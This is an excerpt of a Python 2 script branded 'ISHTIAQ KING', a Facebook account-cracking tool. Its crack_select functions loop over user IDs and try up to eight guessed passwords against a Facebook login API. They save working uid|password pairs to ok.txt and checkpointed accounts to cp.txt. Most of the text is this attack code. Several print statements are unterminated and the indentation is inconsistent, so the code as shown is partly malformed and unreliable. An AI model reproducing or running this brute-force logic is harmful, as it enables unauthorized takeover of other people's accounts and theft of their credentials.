...
try:
    requests.get('https://www.google.com/search?q=ISHTIAQ KING')
    requests.get('https://m.youtube.com/results?search_query=ISHTIAQ KHAN OFFICAL+Mr.+Error')
...
def logo():
    os.system('echo "\n      _   _   ___  ______ _____ \n     | | | | / _ \\ | ___ \\_   _|\n     | |_| |/ /_\\ \\| |_/ / | |  \n     |  _  ||  _  ||    /  | |  \n     | | | || | | || |\\ \\ _| |_ \n     \\_| |_/\\_| |_/\\_| \\_|\\___/ \n    ###############################\n    # TOOL NAME: { ISHTIAQ KING}      #\n    # AUTHOR   : MR ISHTIAQ KING         #\n    # GITHUB   : git.io/AS       #\n    ###############################" | lolcat -a -d 2 -s 50')
...
def main():
    ...
    print '\x1b[94;1m  [3] FILE CLONING
    print ''\x1b[95;1m [4] UPDATE TOOL'
    print '\x1b[96;1m  [J] JOIN MR ISHTIAQ  GROUP \x1b[92;1m\xe2\x9c\x98\x1b[91;1m\xe2\x9c\x98'
...
def menu():
    ...
    print '\x1b[91;1m  [3] NAME PASSWORD CRICKING
   print '''\x1b[90;1m  [0] BACK'
    menu_option()
...
def crack_select1():
    ...
    os.system('clear')
    logo()
    print ''✈️MOOD ON KRO AGAR ID ANAHII RAHII
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        data = requests.get(api, params = params, headers = headers_)
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            print ' \x1b[1;32m[PAGAL OKY] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in data.json()['error_msg']:
                            print ' \x1b[1;33m[PAGAL CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('cp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            data = requests.get(api, params = params, headers = headers_)
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in data.json()['error_msg']:
                                print ' \x1b[1;33m[PAGAL-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('cp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                data = requests.get(api, params = params, headers = headers_)
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    data = requests.get(api, params = params, headers = headers_)
                                    if 'access_token' in data.text and 'EAAA' in data.text:
                                        print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in data.json()['error_msg']:
                                        print ' \x1b[1;33m[PAGAL-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        data = requests.get(api, params = params, headers = headers_)
                                        if 'access_token' in data.text and 'EAAA' in data.text:
                                            print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('ok.txt', 'a')
                                            ok.write(uid + '|' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in data.json()['error_msg']:
                                            print ' \x1b[1;33m[PAGAL-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('cp.txt', 'a')
                                            cp.write(uid + '|' + pass8 + '\n')
                                            cp.close()
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            data = requests.get(api, params = params, headers = headers_)
            if 'access_token' in data.text and 'EAAA' in data.text:
                print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in data.json()['error_msg']:
                print ' \x1b[1;33m[PAGAL-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                data = requests.get(api, params = params, headers = headers_)
                if 'access_token' in data.text and 'EAAA' in data.text:
                    print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                    ...
                    data = requests.get(api, params = params, headers = headers_)
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                        ...
                        data = requests.get(api, params = params, headers = headers_)
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            print ' \x1b[1;32m[PAGAL-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                            ...
                            if 'access_token' in data.text and 'EAAA' in data.text:
                                ...
                                if 'access_token' in data.text and 'EAAA' in data.text:
                                    ...
                                    print ' \x1b[1;33m[PAGAL-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
